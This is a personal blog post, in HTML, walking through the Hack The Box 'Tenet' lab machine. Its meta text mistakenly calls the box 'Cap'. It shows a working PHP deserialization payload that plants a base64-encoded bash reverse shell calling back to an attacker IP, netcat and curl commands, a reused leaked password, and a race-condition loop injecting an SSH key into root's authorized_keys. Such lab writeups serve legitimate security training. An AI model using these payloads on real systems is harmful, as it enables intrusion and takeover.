@@ -1,0 +1,679 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.23.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Tenet Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Tenet Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-tenet/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-07T18:46:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-tenet/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Alex Loney</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>My awesome biography constrained to a sentence or two goes here.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Tenet Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-07T18:46:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB: Tenet Writeup
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr />
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Beginning this box as every box, with a <code class="language-plaintext highlighter-rouge">nmap</code> scan of the box to locate open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/tenet 10.10.10.223
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-07 20:00 EDT
+Nmap scan report <span class="k">for </span>10.10.10.223
+Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.61 seconds
+</code></pre></div></div>
+
+<h1 id="foothold">Foothold</h1>
+<p>The box appears to have only two open ports (<code class="language-plaintext highlighter-rouge">80</code> and <code class="language-plaintext highlighter-rouge">22</code>). Visiting port <code class="language-plaintext highlighter-rouge">80</code>, it appears to be an Apache site, so then running <code class="language-plaintext highlighter-rouge">gobuster</code> on it locates an interesting directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-u</span> http://10.10.10.223
+...<span class="o">{</span>snip<span class="o">}</span>...
+/wordpress <span class="o">(</span>Status: 301<span class="o">}</span>
+...<span class="o">{</span>snip<span class="o">}</span>...
+</code></pre></div></div>
+
+<p>Visiting the <code class="language-plaintext highlighter-rouge">/wordpress</code> URL in Firefox gives a badly formatted Wordpress site, which looks like it’s trying to add resources from <code class="language-plaintext highlighter-rouge">tenet.htb</code>. So we may add <code class="language-plaintext highlighter-rouge">10.10.10.223 tenet.htb</code> to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<p>Browsing the site, I see a user <code class="language-plaintext highlighter-rouge">neil</code> posted a comment:</p>
+<blockquote>
+  <p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
+</blockquote>
+
+<p>So that’s interesting, it sounds like there’s a “sator” php file (maybe <code class="language-plaintext highlighter-rouge">sator.php</code>?). Visiting <code class="language-plaintext highlighter-rouge">http://tenet.htb/sator.php</code> gives a 404 error, but remembering from before, we’re within the <code class="language-plaintext highlighter-rouge">/wordpress</code> directory, so what about <code class="language-plaintext highlighter-rouge">http://10.10.10.223/sator.php</code>? Success!!</p>
+
+<p>This <code class="language-plaintext highlighter-rouge">sator.php</code> script is printing the following:</p>
+
+<blockquote>
+  <p>[+] Grabbing users from text file
+[] Database updated</p>
+</blockquote>
+
+<p>The comment from neil on the Wordpress form mentioned a backup file, so accessing <code class="language-plaintext highlighter-rouge">http://10.10.10.223/sator.php.bak</code> and it exists!</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
+        <span class="p">}</span>
+
+
+        <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
+        <span class="p">{</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+                <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
+        <span class="c1">//      echo 'Gotta get this working properly...';</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Examining this PHP script, we may see that it is receiving user input via <code class="language-plaintext highlighter-rouge">arepo</code> variable, passing that to <code class="language-plaintext highlighter-rouge">unserialize</code>, then calling the <code class="language-plaintext highlighter-rouge">DatabaseExport</code> class. This looks like a classic example of PHP object deserialization. Basically, from my understanding, what is happening is that PHP will allow you to serialize a class and all of the data within it into a string which may then be deserialized back into a class. Then when the control flow exits, the <code class="language-plaintext highlighter-rouge">__destruct</code> function is called on it. In this example, the <code class="language-plaintext highlighter-rouge">__destruct</code> function writes the <code class="language-plaintext highlighter-rouge">data</code> value to <code class="language-plaintext highlighter-rouge">user_file</code>. <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">More on PHP deserialization may be read here</a>.</p>
+
+<p>Since we know the name of the class (<code class="language-plaintext highlighter-rouge">DatabaseExport</code>) as well as the variable names (<code class="language-plaintext highlighter-rouge">user_file</code> and <code class="language-plaintext highlighter-rouge">data</code>), we can construct a payload that is a deserialized PHP object that will allow us to write data out to an arbitrary output file of our choice.</p>
+
+<p>For this payload, we will write out to a PHP file with a very basic reverse shell.</p>
+
+<p>To begin with, the reverse shell that I’d like to attempt is the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt; /dev/tcp/10.10.14.204/9000 0&gt;&amp;1'</span>
+</code></pre></div></div>
+
+<p>Wrapping this in a PHP script to execute it, I get:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.204/9000 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>However, I forsee a problem here. Specifically the “&amp;” character, which in a URL is treated as a special delimiter and might throw the payload off. So instead I’m going to base64 encode the reverse shell payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.14.204/9000 0&gt;&amp;1'"</span> | <span class="nb">base64
+</span>L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK
+</code></pre></div></div>
+
+<p>Then, use the <code class="language-plaintext highlighter-rouge">base64_decode</code> function in PHP to decode it before executing it:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">"L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>So that’s the payload I want to eventually write to a file.</p>
+
+<p>Next up, I need to serialize that and put it into a proper payload that will deserialize correctly. For this, I’ll construct the following payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"rshell.php";s:4:"data";s:106:"&lt;?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));";}
+</code></pre></div></div>
+
+<p>Above we begin with “O” (the letter Oh, not the number zero) to tell PHP that this is an object, followed by the length of the name (14) and the name (“DatabaseExport”). Next the “2” tells PHP that there are two elements in the next section. Within the section we use “s” to denote a string, then “9” for the length of the next string, which is the name of the variable, and the variable itself (“user_file”). Following that we have the same format to provide the variable contents (“rshell.php”). This is then repeated for the “data” variable to contain our payload.</p>
+
+<p>If all goes well, this should generate a file named “rshell.php” which contains the payload to generate a reverse shell.</p>
+
+<p>When using FireFox, the payload may be directly pasted in and FireFox will encode it. However, I like to be a little cautious and pre-encode before uploading.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hURL <span class="nt">-U</span> <span class="s1">'O:14:"DatabaseExport":2:{s:9:"user_file";s:10:"rshell.php";s:4:"data";s:106:"&lt;?php exec(base64_decode("L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK"));";}'</span>
+
+Original    :: O:14:<span class="s2">"DatabaseExport"</span>:2:<span class="o">{</span>s:9:<span class="s2">"user_file"</span><span class="p">;</span>s:10:<span class="s2">"rshell.php"</span><span class="p">;</span>s:4:<span class="s2">"data"</span><span class="p">;</span>s:106:<span class="s2">"&lt;?php exec(base64_decode("</span>L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK<span class="s2">"));"</span><span class="p">;</span><span class="o">}</span>
+URL ENcoded :: O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D
+</code></pre></div></div>
+
+<p>Now that we have the URL encoded payload, we may submit this via the PHP page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A10%3A%22rshell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A106%3A%22%3C%3Fphp%20exec%28base64_decode%28%22L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTAuMTAuMTQuMjA0LzkwMDAgMD4mMScK%22%29%29%3B%22%3B%7D'</span> 
+</code></pre></div></div>
+
+<p>Setting up a netcat listener and visiting the page, we receive a successful callback.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9000
+listening on <span class="o">[</span>any] 9000 ...
+connect to <span class="o">[</span>10.10.14.204] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223] 29836
+python3 <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+www-data@tenet:/var/www/html<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data@tenet:/var/www/html<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We’ve successfully logged in as the <code class="language-plaintext highlighter-rouge">www-data</code> user!</p>
+
+<h1 id="privesc">Privesc</h1>
+
+<p>Now we need to enumerate and determine exactly what we can do. For this I ran <code class="language-plaintext highlighter-rouge">linpeas.sh</code> to locate anything useful, which found the MySQL login information</p>
+
+<blockquote>
+  <p>Mysql Database: wordpress
+Mysql User: neil
+Mysql Pass: Opera2112</p>
+</blockquote>
+
+<p>Quickly checking those credentials, the user <code class="language-plaintext highlighter-rouge">neil</code> has the same password for SSH, so we now have SSH access as <code class="language-plaintext highlighter-rouge">neil</code>.</p>
+
+<p>An additional note is that the script <code class="language-plaintext highlighter-rouge">/usr/local/bin/enableSSH.sh</code> may be executed by <code class="language-plaintext highlighter-rouge">sudo</code> by all users. However, without the <code class="language-plaintext highlighter-rouge">www-data</code> password, that wasn’t possible. But now that we have <code class="language-plaintext highlighter-rouge">neil</code>, that’s possible.</p>
+
+<p>Taking a closer look at the <code class="language-plaintext highlighter-rouge">enableSSH.sh</code> script, it appears to have a hardcoded SSH public key inside of it, it then writes that key to a temporary file, then echos that temporary file into <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code>. If we’re able to somehow intercept that temporary file after it is created but before it is sent into the root SSH keys, we can inject our own key into it. This is basically a race condition.</p>
+
+<p>To do this, we could use <code class="language-plaintext highlighter-rouge">python</code> since that’s on the box, but it’s also possible to do this with a simple bash script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAA...AlU= kali@kali"</span> | <span class="nb">tee</span> /tmp/ssh-<span class="k">*</span> <span class="o">&gt;</span>/dev/null<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>The above will loop continuously and copy our SSH public key into the <code class="language-plaintext highlighter-rouge">/tmp/ssh-*</code> file path if/when it exists. This took a couple times before it successfully worked.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/enableSSH.sh
+</code></pre></div></div>
+
+<p>After executing the above a few times to make sure that the SSH key has made it in, we can then SSH in as root!</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/tags/#htb-medium" class="page__taxonomy-item" rel="tag">htb medium</a><span class="sep">, </span>
+    
+      <a href="/tags/#offsec" class="page__taxonomy-item" rel="tag">offsec</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#blog" class="page__taxonomy-item" rel="tag">blog</a><span class="sep">, </span>
+    
+      <a href="/categories/#htb" class="page__taxonomy-item" rel="tag">htb</a><span class="sep">, </span>
+    
+      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-06-07T18:46:00-07:00">June 7, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=HTB%3A+Tenet+Writeup%20%2Fblog%2Fwriteup%2Fhtb%2Fhtb-tenet%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-tenet%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=%2Fblog%2Fwriteup%2Fhtb%2Fhtb-tenet%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/blog/new-blog-who-dis/" class="pagination--pager" title="New Blog Who Dis
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/blog/new-blog-who-dis/" rel="permalink">New Blog Who Dis
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">I’d like to welcome you to my blog!!
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Alex Loney. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
